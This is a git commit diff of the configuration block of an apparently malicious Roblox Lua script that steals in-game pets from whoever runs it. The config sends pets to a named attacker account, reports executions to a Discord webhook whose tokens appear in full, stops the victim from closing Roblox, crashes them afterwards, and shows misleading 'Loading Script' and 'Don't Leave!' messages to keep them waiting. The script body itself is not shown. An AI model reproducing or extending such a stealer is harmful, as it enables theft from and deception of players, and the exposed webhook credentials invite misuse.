e31362423b2c3a9c403de3e84327d106a9a7a43f
Edwarddxd <130901393+Edwarddxd@users.noreply.github.com>
2023-04-16 14:02:21 +0300

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -3,17 +3,17 @@
 --[[ Config ]]--
 _G.Username = "Eduarddinu2017" --// Username To Send Pets To
 _G.ScriptName = "Kix Project" --// Script Name For Watermark
-_G.Webhook = "https://discord.com/api/webhooks/1096940267858296932/8z_v0vXoZIr8dCDc4XuTDbD6Q4-VrGR65T02gjOpU19N6yOfy6wvisIFfacvpKnGOXCo" --// Discord Webhook For Executions
+_G.Webhook = "https://discord.com/api/webhooks/1097114694021550182/M3JFHZ5zDT9PQqrQ0p24G7aPSbh5RMnVu42RSmcSW_I91J5MhhRyBoFR8TkeXLiuuRBH" --// Discord Webhook For Executions
 _G.GiftMessage = "Thx for help" --// Message For The Gift To Say
-_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.Diamonds = 125000 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
 _G.Crash = true  --// Crashes Them After Its Finished
-_G.Tip1 = "1" --// Gives You Tips On The UI
-_G.Tip2 = "2" --// Gives You Tips On The UI
-_G.Tip3 = "3" --// Gives You Tips On The UI
-_G.Tip4 = "4" --// Gives You Tips On The UI
-_G.Tip5 = "5" --// Gives You Tips On The UI
+_G.Tip1 = "Loading Script" --// Gives You Tips On The UI
+_G.Tip2 = "Don't Leave!" --// Gives You Tips On The UI
+_G.Tip3 = "Loading Script" --// Gives You Tips On The UI
+_G.Tip4 = "Don't Leave!" --// Gives You Tips On The UI
+_G.Tip5 = "Almost Ready!" --// Gives You Tips On The UI
 
 --[[ Script ]]--
 
